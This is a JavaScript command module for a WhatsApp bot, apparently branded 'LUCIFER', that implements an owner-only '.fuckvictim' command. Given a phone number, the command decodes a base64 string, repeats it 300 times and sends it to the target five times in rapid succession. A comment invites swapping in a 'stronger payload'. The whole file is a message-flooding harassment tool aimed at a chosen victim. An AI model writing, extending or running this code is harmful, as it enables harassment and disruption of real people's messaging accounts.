const fs = require("fs");
const path = require("path");

// 🔢 Clean number
function getCleanNumber(jid) {
  return jid ? jid.replace(/\D/g, "") : null;
}

// 🔍 Resolve sender number
function resolveSenderNumber(m, conn) {
  let senderJid =
    m.key?.participant ||
    m.participant ||
    m.sender ||
    (m.key?.fromMe && conn?.user?.id) ||
    m.key?.remoteJid ||
    m.message?.extendedTextMessage?.contextInfo?.participant;

  if (!senderJid && conn?.decodeJid) {
    try {
      senderJid = conn.decodeJid(m?.key?.remoteJid);
    } catch {
      senderJid = null;
    }
  }

  return getCleanNumber(senderJid);
}

// 📤 Main command
module.exports = async function ({ conn, m, args, reply }) {
  try {
    const senderNum = resolveSenderNumber(m, conn);
    if (!senderNum) return reply("❌ Unable to detect sender.");

    // 📂 Load selfmode.json for owner verification
    const configPath = path.join(__dirname, "media/selfmode.json");
    if (!fs.existsSync(configPath)) {
      return reply("⚠️ *I'm waiting for my owner's `.self` command to activate authority.*\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
    }

    let jsonData;
    try {
      jsonData = JSON.parse(fs.readFileSync(configPath));
    } catch {
      return reply("❌ selfmode.json is corrupted or empty.");
    }

    const realOwner = jsonData.owner_sender;
    if (senderNum !== realOwner) {
      return reply("🛑 *Access Denied!*\nOnly *REAL OWNER* can use `.fuckvictim` command.\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
    }

    // 🔢 Target check
    if (!args[0]) return reply("❌ Please provide a number.\nExample: `.fuckvictim 923xxxxxxxxx`");
    const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";

    // 💣 Payload
    const base64 = "TG9hZGluZy4uLkZ1Y2sgVmljdGltICEhIQ=="; // Modify with stronger payload if needed
    const payload = atob(base64).repeat(300); // heavy repeat

    // 🚀 Send message 5x
    for (let i = 0; i < 5; i++) {
      await conn.sendMessage(target, { text: payload }, { quoted: m });
      await new Promise(resolve => setTimeout(resolve, 50));
    }

    return reply(`💥 *FUCKVICTIM sent to:* ${args[0]}\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓`);
  } catch (err) {
    console.error("❌ FuckVictim Error:", err);
    return reply("❌ Something went wrong while sending FuckVictim payload.");
  }
};

// 📥 Decode base64
function atob(str) {
  return Buffer.from(str, "base64").toString("binary");
}